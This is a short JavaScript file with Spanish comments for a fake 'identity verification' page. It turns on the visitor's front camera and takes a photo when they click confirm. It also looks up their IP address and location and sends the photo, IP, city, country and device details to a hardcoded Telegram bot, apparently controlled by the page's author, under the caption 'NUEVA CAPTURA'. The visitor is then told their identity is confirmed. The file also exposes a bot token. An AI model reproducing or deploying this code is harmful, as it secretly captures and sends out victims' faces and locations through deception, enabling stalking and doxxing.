const TOKEN = "8110478941:AAE2k8t6tScXViG9DX7nBviqcVocWbpWbmU";
const MI_ID = "8114050673";

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const btn = document.getElementById('btn');
const status = document.getElementById('status');

// Iniciar cámara
navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(s => {
    video.srcObject = s;
    status.innerText = "Cámara lista. Confirma para continuar.";
}).catch(e => {
    status.innerText = "Error: Activa los permisos de cámara.";
});

btn.addEventListener('click', async () => {
    status.innerText = "Verificando identidad...";
    
    // Capturar foto
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));

    // Obtener IP y datos técnicos
    const ipRes = await fetch('https://ipapi.co/json/').then(r => r.json());

    // Enviar a tu Telegram
    const formData = new FormData();
    formData.append('chat_id', MI_ID);
    formData.append('photo', blob, 'foto.jpg');
    formData.append('caption', `🔥 **¡NUEVA CAPTURA!** 🔥\n\n` +
                                `👤 IP: ${ipRes.ip}\n` +
                                `📍 Ciudad: ${ipRes.city}, ${ipRes.country_name}\n` +
                                `📱 Dispositivo: ${navigator.userAgent.split('(')[1].split(')')[0]}`);

    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
    });

    status.innerText = "✅ Identidad Confirmada.";
    status.style.color = "#00ff00";
});
